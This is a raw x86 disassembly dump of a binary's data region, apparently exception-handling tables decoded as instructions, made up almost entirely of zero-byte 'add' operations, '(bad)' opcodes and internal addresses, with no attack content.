  410433:	add    BYTE PTR [eax+eax*1],al
  410436:	add    BYTE PTR [eax],al
  410438:	push   cs
  410439:	add    BYTE PTR [eax],al
  41043b:	add    BYTE PTR [edi],cl
  41043d:	add    BYTE PTR [eax],al
  41043f:	add    BYTE PTR [ecx],al
  410441:	add    BYTE PTR [eax],al
  410443:	add    al,cl
  410445:	add    al,0x41
  410447:	add    bh,bh
  410449:	(bad)  
  41044a:	(bad)  
  41044b:	push   DWORD PTR [eax+0x40f2]
  410451:	add    BYTE PTR [eax],al
  410453:	add    BYTE PTR [eax+0x10040f2],bh
  410459:	add    BYTE PTR [eax],al
  41045b:	add    al,al
  41045d:	repnz inc eax
  41045f:	add    BYTE PTR [edx],al
  410461:	add    BYTE PTR [eax],al
  410463:	add    al,cl
  410465:	repnz inc eax
  410467:	add    BYTE PTR [ebx],al
  410469:	add    BYTE PTR [eax],al
  41046b:	add    BYTE PTR [eax],al
  41046d:	add    BYTE PTR [eax],al
  41046f:	add    BYTE PTR [eax+eax*1],al
  410472:	add    BYTE PTR [eax],al
  410474:	shl    dl,1
  410476:	inc    eax
  410477:	add    BYTE PTR ds:0xd8000000,al
  41047d:	repnz inc eax
  41047f:	add    BYTE PTR [esi],al
  410481:	add    BYTE PTR [eax],al
  410483:	add    al,ah
  410485:	repnz inc eax
  410487:	add    BYTE PTR [edi],al
  410489:	add    BYTE PTR [eax],al
  41048b:	add    al,ch
  41048d:	repnz inc eax
  41048f:	add    BYTE PTR [eax+eax*1],al
  410492:	add    BYTE PTR [eax],al
  410494:	lock repnz inc eax
  410497:	add    BYTE PTR [ecx],cl
  410499:	add    BYTE PTR [eax],al
  41049b:	add    al,bh
  41049d:	repnz inc eax
  41049f:	add    BYTE PTR [edx],cl
  4104a1:	add    BYTE PTR [eax],al
  4104a3:	add    BYTE PTR [eax],al
  4104a5:	repz inc eax
  4104a7:	add    BYTE PTR [ebx],cl
  4104a9:	add    BYTE PTR [eax],al
  4104ab:	add    BYTE PTR [eax],cl
  4104ad:	repz inc eax
  4104af:	add    BYTE PTR [eax+eax*1],cl
  4104b2:	add    BYTE PTR [eax],al
  4104b4:	adc    bl,dh
  4104b6:	inc    eax
  4104b7:	add    BYTE PTR [eax+eax*1],al
  4104ba:	add    BYTE PTR [eax],al
  4104bc:	sbb    bl,dh
  4104be:	inc    eax
  4104bf:	add    BYTE PTR [ebx],al
  4104c1:	add    BYTE PTR [eax],al
  4104c3:	add    BYTE PTR [eax],al
  4104c5:	add    BYTE PTR [eax],al
  4104c7:	add    BYTE PTR [eax],cl
  4104c9:	add    BYTE PTR [eax],al
  4104cb:	add    BYTE PTR [eax],dl
  4104cd:	adc    BYTE PTR [ecx+0x0],al
  4104d0:	mov    al,0xff
  4104d2:	(bad)  
  4104d3:	call   DWORD PTR [ebx+0x6b]
  4104d6:	inc    eax
  4104d7:	add    BYTE PTR [edx],ah
  4104d9:	add    eax,0x31993
  4104de:	add    BYTE PTR [eax],al
  4104e0:	cld    
  4104e1:	add    al,0x41
  4104e3:	add    BYTE PTR [ecx],al
  4104e5:	add    BYTE PTR [eax],al
  4104e7:	add    BYTE PTR [eax*1+0x41],dl
	...
  4104fa:	add    BYTE PTR [eax],al
  4104fc:	(bad)  
  4104fd:	(bad)  
  4104fe:	(bad)  
  4104ff:	dec    DWORD PTR [edx-0xd]
  410502:	inc    eax
	...
  410513:	add    BYTE PTR [ecx],al
  410515:	add    BYTE PTR [eax],al
  410517:	add    BYTE PTR [ecx],al
  410519:	add    BYTE PTR [eax],al
  41051b:	add    BYTE PTR [edx],al
  41051d:	add    BYTE PTR [eax],al
  41051f:	add    BYTE PTR [ecx],al
  410521:	add    BYTE PTR [eax],al
  410523:	add    BYTE PTR [eax],ch
  410525:	add    eax,0x41
  41052a:	add    BYTE PTR [eax],al
  41052c:	sub    al,0x10
  41052e:	inc    ecx
  41052f:	add    BYTE PTR [eax],al
  410531:	add    BYTE PTR [eax],al
  410533:	add    BYTE PTR [esi],dl
  410535:	outs   dx,BYTE PTR ds:[esi]
  410536:	inc    eax
  410537:	add    BYTE PTR [edx],ah
  410539:	add    eax,0x61993
  41053e:	add    BYTE PTR [eax],al
  410540:	pop    esp
  410541:	add    eax,0x10041
  410546:	add    BYTE PTR [eax],al
  410548:	mov    WORD PTR ds:0x41,es
	...
  41055a:	add    BYTE PTR [eax],al
  41055c:	(bad)  
  41055d:	(bad)  
  41055e:	(bad)  
  41055f:	push   DWORD PTR [ebx-0xd]
  410562:	inc    eax
  410563:	add    BYTE PTR [eax],al
  410565:	add    BYTE PTR [eax],al
  410567:	add    BYTE PTR [ebx+esi*8+0x40],bh
  41056b:	add    BYTE PTR [ecx],al
  41056d:	add    BYTE PTR [eax],al
  41056f:	add    BYTE PTR [eax],al
  410571:	add    BYTE PTR [eax],al
  410573:	add    BYTE PTR [edx],al
  410575:	add    BYTE PTR [eax],al
  410577:	add    BYTE PTR [ebp+0x20040f3],al
  41057d:	add    BYTE PTR [eax],al
  41057f:	add    BYTE PTR [esi+0x10040f3],cl
  410585:	add    BYTE PTR [eax],al
  410587:	add    BYTE PTR [eax],al
  410589:	add    BYTE PTR [eax],al
  41058b:	add    BYTE PTR [edx],al
  41058d:	add    BYTE PTR [eax],al
  41058f:	add    BYTE PTR [eax+eax*1],al
  410592:	add    BYTE PTR [eax],al
  410594:	add    eax,0x1000000
  410599:	add    BYTE PTR [eax],al
  41059b:	add    BYTE PTR [eax+0x4105],ah
  4105a1:	add    BYTE PTR [eax],al
  4105a3:	add    BYTE PTR [eax+edx*1],ch
  4105a6:	inc    ecx
  4105a7:	add    BYTE PTR [eax],al
  4105a9:	add    BYTE PTR [eax],al
  4105ab:	add    BYTE PTR [edi+0x22004070],al
  4105b1:	add    eax,0x71993
  4105b6:	add    BYTE PTR [eax],al
  4105b8:	aam    0x5
  4105ba:	inc    ecx
  4105bb:	add    BYTE PTR [edx],al
  4105bd:	add    BYTE PTR [eax],al
  4105bf:	add    BYTE PTR [esi+eax*1],cl
  4105c2:	inc    ecx
	...
  4105d3:	add    bh,bh
  4105d5:	(bad)  
  4105d6:	(bad)  
  4105d7:	push   DWORD PTR [edi+0x40f3]
  4105dd:	add    BYTE PTR [eax],al
  4105df:	add    BYTE PTR [eax],al
  4105e1:	add    BYTE PTR [eax],al
  4105e3:	add    BYTE PTR [ecx],al
  4105e5:	add    BYTE PTR [eax],al
  4105e7:	add    BYTE PTR [edi+0x10040f3],bh
  4105ed:	add    BYTE PTR [eax],al
  4105ef:	add    bh,al
  4105f1:	repz inc eax
	...
  4105fb:	add    BYTE PTR [eax+eax*1],al
  4105fe:	add    BYTE PTR [eax],al
  410600:	add    BYTE PTR [eax],al
  410602:	add    BYTE PTR [eax],al
  410604:	add    al,0x0
  410606:	add    BYTE PTR [eax],al
  410608:	add    BYTE PTR [eax],al
  41060a:	add    BYTE PTR [eax],al
  41060c:	add    eax,0x5000000
  410611:	add    BYTE PTR [eax],al
  410613:	add    BYTE PTR [esi],al
  410615:	add    BYTE PTR [eax],al
  410617:	add    BYTE PTR [ecx],al
  410619:	add    BYTE PTR [eax],al
  41061b:	add    BYTE PTR [esi+eax*1],dh
  41061e:	inc    ecx
  41061f:	add    BYTE PTR [ecx],al
  410621:	add    BYTE PTR [eax],al
  410623:	add    BYTE PTR [ebx],al
  410625:	add    BYTE PTR [eax],al
  410627:	add    BYTE PTR [esi],al
  410629:	add    BYTE PTR [eax],al
  41062b:	add    BYTE PTR [ecx],al
  41062d:	add    BYTE PTR [eax],al
  41062f:	add    BYTE PTR [esi+eax*1+0x41],al
	...
  41063f:	add    bl,dh
  410641:	jne    0x410683
  410643:	add    BYTE PTR [eax],cl
  410645:	add    BYTE PTR [eax],al
  410647:	add    BYTE PTR [eax],dl
  410649:	adc    BYTE PTR [ecx+0x0],al
  41064c:	aam    0xff
  41064e:	(bad)  
  41064f:	(bad)  
  410650:	jg     0x4106c7
  410652:	inc    eax
  410653:	add    BYTE PTR [edx],ah
  410655:	add    eax,0x31993
  41065a:	add    BYTE PTR [eax],al
  41065c:	js     0x410664
  41065e:	inc    ecx
  41065f:	add    BYTE PTR [ecx],al
  410661:	add    BYTE PTR [eax],al
  410663:	add    BYTE PTR [eax+0x4106],dl
	...
  410675:	add    BYTE PTR [eax],al
  410677:	add    bh,bh
  410679:	(bad)  
  41067a:	(bad)  
  41067b:	inc    DWORD PTR [eax]
  41067d:	add    BYTE PTR [eax],al
  41067f:	add    BYTE PTR [eax],al
  410681:	add    BYTE PTR [eax],al
  410683:	add    cl,bh
  410685:	repz inc eax
  410687:	add    bh,bh
  410689:	(bad)  
  41068a:	(bad)  
  41068b:	inc    DWORD PTR [eax]
  41068d:	add    BYTE PTR [eax],al
  41068f:	add    BYTE PTR [eax],al
  410691:	add    BYTE PTR [eax],al
  410693:	add    BYTE PTR [ecx],al
  410695:	add    BYTE PTR [eax],al
  410697:	add    BYTE PTR [edx],al
  410699:	add    BYTE PTR [eax],al
  41069b:	add    BYTE PTR [ecx],al
  41069d:	add    BYTE PTR [eax],al
  41069f:	add    BYTE PTR [esi+eax*1+0x80041],ah
  4106a6:	add    BYTE PTR [eax],al
  4106a8:	adc    BYTE PTR [eax],dl
  4106aa:	inc    ecx
  4106ab:	add    ah,cl
  4106ad:	(bad)  
  4106ae:	(bad)  
  4106af:	jmp    DWORD PTR [esi+0x22004076]
  4106b5:	add    eax,0x31993
  4106ba:	add    BYTE PTR [eax],al
  4106bc:	fadd   DWORD PTR [esi]
  4106be:	inc    ecx
  4106bf:	add    BYTE PTR [ecx],al
  4106c1:	add    BYTE PTR [eax],al
  4106c3:	add    al,dh
  4106c5:	push   es
  4106c6:	inc    ecx
	...
  4106d7:	add    bh,bh
  4106d9:	(bad)  
  4106da:	(bad)  
  4106db:	inc    DWORD PTR [eax]
  4106dd:	add    BYTE PTR [eax],al
  4106df:	add    BYTE PTR [eax],al
  4106e1:	add    BYTE PTR [eax],al
  4106e3:	add    BYTE PTR [ebx],ch
  4106e5:	hlt    
  4106e6:	inc    eax
  4106e7:	add    bh,bh
  4106e9:	(bad)  
  4106ea:	(bad)  
  4106eb:	inc    DWORD PTR [eax]
  4106ed:	add    BYTE PTR [eax],al
  4106ef:	add    BYTE PTR [eax],al
  4106f1:	add    BYTE PTR [eax],al
  4106f3:	add    BYTE PTR [ecx],al
  4106f5:	add    BYTE PTR [eax],al
  4106f7:	add    BYTE PTR [edx],al
  4106f9:	add    BYTE PTR [eax],al
  4106fb:	add    BYTE PTR [ecx],al
  4106fd:	add    BYTE PTR [eax],al
  4106ff:	add    BYTE PTR [edi+eax*1],al
  410702:	inc    ecx
  410703:	add    BYTE PTR [eax],cl
  410705:	add    BYTE PTR [eax],al
  410707:	add    BYTE PTR [eax],dl
  410709:	adc    BYTE PTR [ecx+0x0],al
  41070c:	in     al,0xff
  41070e:	(bad)  
  41070f:	call   DWORD PTR [ebp+0x77]
  410712:	inc    eax
  410713:	add    BYTE PTR [edx],ah
  410715:	add    eax,0x31993
  41071a:	add    BYTE PTR [eax],al
  41071c:	cmp    BYTE PTR [edi],al
  41071e:	inc    ecx
  41071f:	add    BYTE PTR [ecx],al
  410721:	add    BYTE PTR [eax],al
  410723:	add    BYTE PTR [eax+0x7],dl
  410726:	inc    ecx
	...
  410737:	add    bh,bh
  410739:	(bad)  
  41073a:	(bad)  
  41073b:	inc    DWORD PTR [eax]
  41073d:	add    BYTE PTR [eax],al
  41073f:	add    BYTE PTR [eax],al
  410741:	add    BYTE PTR [eax],al
  410743:	add    BYTE PTR [ebp-0xc],bl
  410746:	inc    eax
  410747:	add    bh,bh
  410749:	(bad)  
  41074a:	(bad)  
  41074b:	inc    DWORD PTR [eax]
  41074d:	add    BYTE PTR [eax],al
  41074f:	add    BYTE PTR [eax],al
  410751:	add    BYTE PTR [eax],al
  410753:	add    BYTE PTR [ecx],al
  410755:	add    BYTE PTR [eax],al
  410757:	add    BYTE PTR [edx],al
  410759:	add    BYTE PTR [eax],al
  41075b:	add    BYTE PTR [ecx],al
  41075d:	add    BYTE PTR [eax],al
  41075f:	add    BYTE PTR [edi+eax*1+0x41],ah
	...
  41076f:	add    BYTE PTR [ecx+0x22004078],al
  410775:	add    eax,0x41993
  41077a:	add    BYTE PTR [eax],al
  41077c:	cwde   
  41077d:	pop    es
  41077e:	inc    ecx
  41077f:	add    BYTE PTR [ecx],al
  410781:	add    BYTE PTR [eax],al
  410783:	add    BYTE PTR [eax+0x4107],bh
	...
  410795:	add    BYTE PTR [eax],al
  410797:	add    bh,bh
  410799:	(bad)  
  41079a:	(bad)  
  41079b:	inc    DWORD PTR [esi+0x40f4]
  4107a1:	add    BYTE PTR [eax],al
  4107a3:	add    BYTE PTR [eax],al
  4107a5:	add    BYTE PTR [eax],al
  4107a7:	add    BYTE PTR [ecx],al
  4107a9:	add    BYTE PTR [eax],al
  4107ab:	add    BYTE PTR [esi+0x40f4],cl
  4107b1:	add    BYTE PTR [eax],al
  4107b3:	add    BYTE PTR [eax],al
  4107b5:	add    BYTE PTR [eax],al
  4107b7:	add    BYTE PTR [ecx],al
  4107b9:	add    BYTE PTR [eax],al
  4107bb:	add    BYTE PTR [edx],al
  4107bd:	add    BYTE PTR [eax],al
  4107bf:	add    BYTE PTR [ebx],al
  4107c1:	add    BYTE PTR [eax],al
  4107c3:	add    BYTE PTR [edx],al
  4107c5:	add    BYTE PTR [eax],al
  4107c7:	add    ah,cl
  4107c9:	pop    es
  4107ca:	inc    ecx
  4107cb:	add    BYTE PTR [eax],cl
  4107cd:	add    BYTE PTR [eax],al
  4107cf:	add    BYTE PTR [eax],dl
  4107d1:	adc    BYTE PTR [ecx+0x0],al
  4107d4:	call   0x594107d8
  4107d9:	jns    0x41081b
  4107db:	add    BYTE PTR [eax],al
  4107dd:	add    BYTE PTR [eax],al
  4107df:	add    BYTE PTR [eax+edx*1],ch
  4107e2:	inc    ecx
  4107e3:	add    BYTE PTR [eax],al
  4107e5:	add    BYTE PTR [eax],al
  4107e7:	add    BYTE PTR [ebp+0x22004079],al
  4107ed:	add    eax,0x11993
  4107f2:	add    BYTE PTR [eax],al
  4107f4:	adc    BYTE PTR [eax],cl
  4107f6:	inc    ecx
	...
  41080f:	add    bh,bh
  410811:	(bad)  
  410812:	(bad)  
  410813:	push   DWORD PTR [esi+0x220040f4]
  410819:	add    eax,0x31993
  41081e:	add    BYTE PTR [eax],al
  410820:	cmp    al,0x8
  410822:	inc    ecx
  410823:	add    BYTE PTR [ecx],al
  410825:	add    BYTE PTR [eax],al
  410827:	add    BYTE PTR [eax+ecx*1+0x41],dl
	...
  41083b:	add    bh,bh
  41083d:	(bad)  
  41083e:	(bad)  
  41083f:	(bad)  
  410840:	fdivrp st(4),st
  410842:	inc    eax
	...
  410853:	add    BYTE PTR [ecx],al
  410855:	add    BYTE PTR [eax],al
  410857:	add    BYTE PTR [ecx],al
  410859:	add    BYTE PTR [eax],al
  41085b:	add    BYTE PTR [edx],al
  41085d:	add    BYTE PTR [eax],al
  41085f:	add    BYTE PTR [ecx],al
  410861:	add    BYTE PTR [eax],al
  410863:	add    BYTE PTR [eax+0x8],ch
  410866:	inc    ecx
  410867:	add    BYTE PTR [eax],cl
  410869:	add    BYTE PTR [eax],al
  41086b:	add    BYTE PTR [eax],dl
  41086d:	adc    BYTE PTR [ecx+0x0],al
  410870:	in     al,dx
  410871:	(bad)  
  410872:	(bad)  
  410873:	call   FWORD PTR [eax+0x2200407a]
  410879:	add    eax,0x31993
  41087e:	add    BYTE PTR [eax],al
  410880:	pushf  
  410881:	or     BYTE PTR [ecx+0x0],al
  410884:	add    DWORD PTR [eax],eax
  410886:	add    BYTE PTR [eax],al
  410888:	mov    ah,0x8
  41088a:	inc    ecx
	...
  41089b:	add    bh,bh
  41089d:	(bad)  
  41089e:	(bad)  
  41089f:	inc    DWORD PTR [esi]
  4108a1:	cmc    
  4108a2:	inc    eax
	...
  4108b3:	add    BYTE PTR [ecx],al
  4108b5:	add    BYTE PTR [eax],al
  4108b7:	add    BYTE PTR [ecx],al
  4108b9:	add    BYTE PTR [eax],al
  4108bb:	add    BYTE PTR [edx],al
  4108bd:	add    BYTE PTR [eax],al
  4108bf:	add    BYTE PTR [ecx],al
  4108c1:	add    BYTE PTR [eax],al
  4108c3:	add    al,cl
  4108c5:	or     BYTE PTR [ecx+0x0],al
  4108c8:	add    BYTE PTR [eax],al
  4108ca:	add    BYTE PTR [eax],al
  4108cc:	sub    al,0x10
  4108ce:	inc    ecx
  4108cf:	add    BYTE PTR [eax],al
  4108d1:	add    BYTE PTR [eax],al
  4108d3:	add    BYTE PTR [ebx+edi*2+0x40],bh
  4108d7:	add    BYTE PTR [edx],ah
  4108d9:	add    eax,0xa1993
  4108de:	add    BYTE PTR [eax],al
  4108e0:	adc    BYTE PTR [ecx],cl
  4108e2:	inc    ecx
  4108e3:	add    BYTE PTR [ecx],al
  4108e5:	add    BYTE PTR [eax],al
  4108e7:	add    ah,bh
  4108e9:	or     BYTE PTR [ecx+0x0],al
	...
  4108fc:	add    DWORD PTR [eax],eax
  4108fe:	add    BYTE PTR [eax],al
  410900:	or     BYTE PTR [eax],al
  410902:	add    BYTE PTR [eax],al
  410904:	or     DWORD PTR [eax],eax
  410906:	add    BYTE PTR [eax],al
  410908:	add    al,BYTE PTR [eax]
  41090a:	add    BYTE PTR [eax],al
  41090c:	pusha  
  41090d:	or     DWORD PTR [ecx+0x0],eax
  410910:	(bad)  
  410911:	(bad)  
  410912:	(bad)  
  410913:	jmp    FWORD PTR [edi]
  410915:	cmc    
  410916:	inc    eax
	...
  41091f:	add    BYTE PTR [ecx],al
  410921:	add    BYTE PTR [eax],al
  410923:	add    BYTE PTR [eax],bh
  410925:	cmc    
  410926:	inc    eax
  410927:	add    BYTE PTR [ecx],al
  410929:	add    BYTE PTR [eax],al
  41092b:	add    BYTE PTR [ecx-0xb],al
  41092e:	inc    eax
  41092f:	add    BYTE PTR [ecx],al
  410931:	add    BYTE PTR [eax],al
  410933:	add    BYTE PTR [edx-0xb],cl
  410936:	inc    eax
  410937:	add    BYTE PTR [ecx],al
  410939:	add    BYTE PTR [eax],al
  41093b:	add    BYTE PTR [ebx-0xb],dl
  41093e:	inc    eax
  41093f:	add    BYTE PTR [ecx],al
  410941:	add    BYTE PTR [eax],al
  410943:	add    BYTE PTR [ebp+esi*8+0x40],bl
  410947:	add    BYTE PTR [ecx],al
  410949:	add    BYTE PTR [eax],al
  41094b:	add    BYTE PTR [ebp-0xb],ah
  41094e:	inc    eax
  41094f:	add    BYTE PTR [ecx],al
  410951:	add    BYTE PTR [eax],al
  410953:	add    BYTE PTR [esi-0xb],ch
  410956:	inc    eax
	...
  41095f:	add    BYTE PTR [eax],cl
  410961:	add    BYTE PTR [eax],al
  410963:	add    BYTE PTR [eax],dl
  410965:	adc    BYTE PTR [ecx+0x0],al
  410968:	in     al,0xff
  41096a:	(bad)  
  41096b:	jmp    FWORD PTR [edi*2+0x40]
  410972:	add    BYTE PTR [eax],al
  410974:	sub    al,0x10
  410976:	inc    ecx
  410977:	add    BYTE PTR [eax],al
  410979:	add    BYTE PTR [eax],al
  41097b:	add    BYTE PTR ds:0x2200407d,bh
  410981:	add    eax,0x31993
  410986:	add    BYTE PTR [eax],al
  410988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410989:	or     DWORD PTR [ecx+0x0],eax
  41098c:	add    DWORD PTR [eax],eax
  41098e:	add    BYTE PTR [eax],al
  410990:	mov    esp,0x4109
	...
  4109a1:	add    BYTE PTR [eax],al
  4109a3:	add    bh,bh
  4109a5:	(bad)  
  4109a6:	(bad)  
  4109a7:	inc    DWORD PTR [eax]
  4109a9:	add    BYTE PTR [eax],al
  4109ab:	add    BYTE PTR [eax],al
  4109ad:	add    BYTE PTR [eax],al
  4109af:	add    BYTE PTR [edi-0xffbf0b],dl
  4109b5:	(bad)  
  4109b6:	(bad)  
  4109b7:	inc    DWORD PTR [eax]
  4109b9:	add    BYTE PTR [eax],al
  4109bb:	add    BYTE PTR [eax],al
  4109bd:	add    BYTE PTR [eax],al
  4109bf:	add    BYTE PTR [ecx],al
  4109c1:	add    BYTE PTR [eax],al
  4109c3:	add    BYTE PTR [edx],al
  4109c5:	add    BYTE PTR [eax],al
  4109c7:	add    BYTE PTR [ecx],al
  4109c9:	add    BYTE PTR [eax],al
  4109cb:	add    al,dl
  4109cd:	or     DWORD PTR [ecx+0x0],eax
  4109d0:	or     BYTE PTR [eax],al
  4109d2:	add    BYTE PTR [eax],al
  4109d4:	adc    BYTE PTR [eax],dl
  4109d6:	inc    ecx
  4109d7:	add    al,ah
  4109d9:	(bad)  
  4109da:	(bad)  
  4109db:	(bad)  
  4109dc:	fistp  QWORD PTR [ebp+0x40]
  4109df:	add    BYTE PTR [edx],ah
  4109e1:	add    eax,0x31993
  4109e6:	add    BYTE PTR [eax],al
  4109e8:	add    al,0xa
  4109ea:	inc    ecx
  4109eb:	add    BYTE PTR [ecx],al
  4109ed:	add    BYTE PTR [eax],al
  4109ef:	add    BYTE PTR [edx+ecx*1],bl
  4109f2:	inc    ecx
	...
  410a03:	add    bh,bh
  410a05:	(bad)  
  410a06:	(bad)  
  410a07:	dec    ecx
  410a09:	cmc    
  410a0a:	inc    eax
	...
  410a1b:	add    BYTE PTR [ecx],al
  410a1d:	add    BYTE PTR [eax],al
  410a1f:	add    BYTE PTR [ecx],al
  410a21:	add    BYTE PTR [eax],al
  410a23:	add    BYTE PTR [edx],al
  410a25:	add    BYTE PTR [eax],al
  410a27:	add    BYTE PTR [ecx],al
  410a29:	add    BYTE PTR [eax],al
  410a2b:	add    BYTE PTR [eax],dh
  410a2d:	or     al,BYTE PTR [ecx+0x0]
  410a30:	or     BYTE PTR [eax],al
  410a32:	add    BYTE PTR [eax],al
  410a34:	adc    BYTE PTR [eax],dl
  410a36:	inc    ecx
  410a37:	add    ah,ah
  410a39:	(bad)  
  410a3a:	(bad)  
  410a3b:	jmp    FWORD PTR [ecx+0x7e]
  410a3e:	inc    eax
  410a3f:	add    BYTE PTR [edx],ah
  410a41:	add    eax,0x31993
  410a46:	add    BYTE PTR [eax],al
  410a48:	or     al,BYTE PTR fs:[ecx+0x0]
  410a4c:	add    DWORD PTR [eax],eax
  410a4e:	add    BYTE PTR [eax],al
  410a50:	jl     0x410a5c
  410a52:	inc    ecx
	...
  410a63:	add    bh,bh
  410a65:	(bad)  
  410a66:	(bad)  
  410a67:	push   ecx
  410a69:	cmc    
  410a6a:	inc    eax
	...
  410a7b:	add    BYTE PTR [ecx],al
  410a7d:	add    BYTE PTR [eax],al
  410a7f:	add    BYTE PTR [ecx],al
  410a81:	add    BYTE PTR [eax],al
  410a83:	add    BYTE PTR [edx],al
  410a85:	add    BYTE PTR [eax],al
  410a87:	add    BYTE PTR [ecx],al
  410a89:	add    BYTE PTR [eax],al
  410a8b:	add    BYTE PTR [eax+0x800410a],dl
  410a91:	add    BYTE PTR [eax],al
  410a93:	add    BYTE PTR [eax],dl
  410a95:	adc    BYTE PTR [ecx+0x0],al
  410a98:	in     al,0xff
  410a9a:	(bad)  
  410a9b:	call   FWORD PTR [esi]
  410a9d:	jg     0x410adf
  410a9f:	add    BYTE PTR [edx],ah
  410aa1:	add    eax,0xb1993
  410aa6:	add    BYTE PTR [eax],al
  410aa8:	fmul   DWORD PTR [edx]
  410aaa:	inc    ecx
  410aab:	add    BYTE PTR [ecx],al
  410aad:	add    BYTE PTR [eax],al
  410aaf:	add    ah,al
  410ab1:	or     al,BYTE PTR [ecx+0x0]
	...
  410ac8:	or     DWORD PTR [eax],eax
  410aca:	add    BYTE PTR [eax],al
  410acc:	or     al,BYTE PTR [eax]
  410ace:	add    BYTE PTR [eax],al
  410ad0:	add    DWORD PTR [eax],eax
  410ad2:	add    BYTE PTR [eax],al
  410ad4:	xor    BYTE PTR [ebx],cl
  410ad6:	inc    ecx
  410ad7:	add    bh,bh
  410ad9:	(bad)  
  410ada:	(bad)  
  410adb:	inc    DWORD PTR [eax]
  410add:	add    BYTE PTR [eax],al
  410adf:	add    BYTE PTR [eax],al
  410ae1:	add    BYTE PTR [eax],al
  410ae3:	add    BYTE PTR [ecx],bl
  410ae5:	test   BYTE PTR [eax+0x0],0x0
  410ae9:	add    BYTE PTR [eax],al
  410aeb:	add    BYTE PTR [ecx],ah
  410aed:	test   BYTE PTR [eax+0x0],0x0
  410af1:	add    BYTE PTR [eax],al
  410af3:	add    BYTE PTR [ecx],ch
  410af5:	test   BYTE PTR [eax+0x0],0x0
  410af9:	add    BYTE PTR [eax],al
  410afb:	add    BYTE PTR [ecx],dh
  410afd:	test   BYTE PTR [eax+0x0],0x0
  410b01:	add    BYTE PTR [eax],al
  410b03:	add    BYTE PTR [ecx],bh
  410b05:	test   BYTE PTR [eax+0x0],0x5
  410b09:	add    BYTE PTR [eax],al
  410b0b:	add    BYTE PTR [ecx-0xa],al
  410b0e:	inc    eax
  410b0f:	add    BYTE PTR [eax],al
  410b11:	add    BYTE PTR [eax],al
  410b13:	add    BYTE PTR [ecx-0xa],cl
  410b16:	inc    eax
  410b17:	add    BYTE PTR [eax],al
  410b19:	add    BYTE PTR [eax],al
  410b1b:	add    BYTE PTR [ecx-0xa],dl
  410b1e:	inc    eax
  410b1f:	add    BYTE PTR [eax],al
  410b21:	add    BYTE PTR [eax],al
  410b23:	add    BYTE PTR [ecx-0xa],bl
  410b26:	inc    eax
  410b27:	add    bh,bh
  410b29:	(bad)  
  410b2a:	(bad)  
  410b2b:	inc    DWORD PTR [eax]
  410b2d:	add    BYTE PTR [eax],al
  410b2f:	add    BYTE PTR [eax],cl
  410b31:	add    BYTE PTR [eax],al
  410b33:	add    BYTE PTR [eax],dl
  410b35:	adc    BYTE PTR [ecx+0x0],al
  410b38:	enter  0xffff,0xff
  410b3c:	dec    esi
  410b3d:	add    BYTE PTR [eax+0x0],0x22
  410b41:	add    eax,0x41993
  410b46:	add    BYTE PTR [eax],al
  410b48:	or     eax,DWORD PTR fs:[ecx+0x0]
  410b4c:	add    DWORD PTR [eax],eax
  410b4e:	add    BYTE PTR [eax],al
  410b50:	test   BYTE PTR [ebx],cl
  410b52:	inc    ecx
	...
  410b63:	add    bh,bh
  410b65:	(bad)  
  410b66:	(bad)  
  410b67:	dec    DWORD PTR [ebx+0x40f6]
  410b6d:	add    BYTE PTR [eax],al
  410b6f:	add    BYTE PTR [eax],al
  410b71:	add    BYTE PTR [eax],al
  410b73:	add    BYTE PTR [ecx],al
  410b75:	add    BYTE PTR [eax],al
  410b77:	add    BYTE PTR [ebx+0x40f6],dl
  410b7d:	add    BYTE PTR [eax],al
  410b7f:	add    BYTE PTR [eax],al
  410b81:	add    BYTE PTR [eax],al
  410b83:	add    BYTE PTR [ecx],al
  410b85:	add    BYTE PTR [eax],al
  410b87:	add    BYTE PTR [edx],al
  410b89:	add    BYTE PTR [eax],al
  410b8b:	add    BYTE PTR [ebx],al
  410b8d:	add    BYTE PTR [eax],al
  410b8f:	add    BYTE PTR [ecx],al
  410b91:	add    BYTE PTR [eax],al
  410b93:	add    BYTE PTR [eax+0x800410b],bl
  410b99:	add    BYTE PTR [eax],al
  410b9b:	add    BYTE PTR [eax],dl
  410b9d:	adc    BYTE PTR [ecx+0x0],al
  410ba0:	call   0xc7410ba4
  410ba5:	add    DWORD PTR [eax+0x0],0x22
  410ba9:	add    eax,0x91993
  410bae:	add    BYTE PTR [eax],al
  410bb0:	loopne 0x410bbd
  410bb2:	inc    ecx
  410bb3:	add    BYTE PTR [ecx],al
  410bb5:	add    BYTE PTR [eax],al
  410bb7:	add    ah,cl
  410bb9:	or     eax,DWORD PTR [ecx+0x0]
	...
  410bcc:	add    DWORD PTR [eax],eax
  410bce:	add    BYTE PTR [eax],al
  410bd0:	pop    es
  410bd1:	add    BYTE PTR [eax],al
  410bd3:	add    BYTE PTR [eax],cl
  410bd5:	add    BYTE PTR [eax],al
  410bd7:	add    BYTE PTR [edx],al
  410bd9:	add    BYTE PTR [eax],al
  410bdb:	add    BYTE PTR [eax],ch
  410bdd:	or     al,0x41
  410bdf:	add    bh,bh
  410be1:	(bad)  
  410be2:	(bad)  
  410be3:	(bad)  
  410be4:	mov    ebx,0x40f6
  410be9:	add    BYTE PTR [eax],al
  410beb:	add    BYTE PTR [eax],al
  410bed:	add    BYTE PTR [eax],al
  410bef:	add    BYTE PTR [ecx],al
  410bf1:	add    BYTE PTR [eax],al
  410bf3:	add    ah,al
  410bf5:	test   BYTE PTR [eax+0x0],0x1
  410bf9:	add    BYTE PTR [eax],al
  410bfb:	add    ah,cl
  410bfd:	test   BYTE PTR [eax+0x0],0x1
  410c01:	add    BYTE PTR [eax],al
  410c03:	add    ch,dl
  410c05:	test   BYTE PTR [eax+0x0],0x1
  410c09:	add    BYTE PTR [eax],al
  410c0b:	add    dh,bl
  410c0d:	test   BYTE PTR [eax+0x0],0x1
  410c11:	add    BYTE PTR [eax],al
  410c13:	add    bh,ah
  410c15:	test   BYTE PTR [eax+0x0],0x1
  410c19:	add    BYTE PTR [eax],al
  410c1b:	add    al,dh
  410c1d:	test   BYTE PTR [eax+0x0],0x0
  410c21:	add    BYTE PTR [eax],al
  410c23:	add    BYTE PTR [eax],al
  410c25:	add    BYTE PTR [eax],al
  410c27:	add    BYTE PTR [eax],cl
  410c29:	add    BYTE PTR [eax],al
  410c2b:	add    BYTE PTR [eax],dl
  410c2d:	adc    BYTE PTR [ecx+0x0],al
  410c30:	enter  0xffff,0xff
  410c34:	xrelease xchg BYTE PTR [eax+0x0],al
  410c38:	add    BYTE PTR [eax],al
  410c3a:	add    BYTE PTR [eax],al
  410c3c:	sub    al,0x10
  410c3e:	inc    ecx
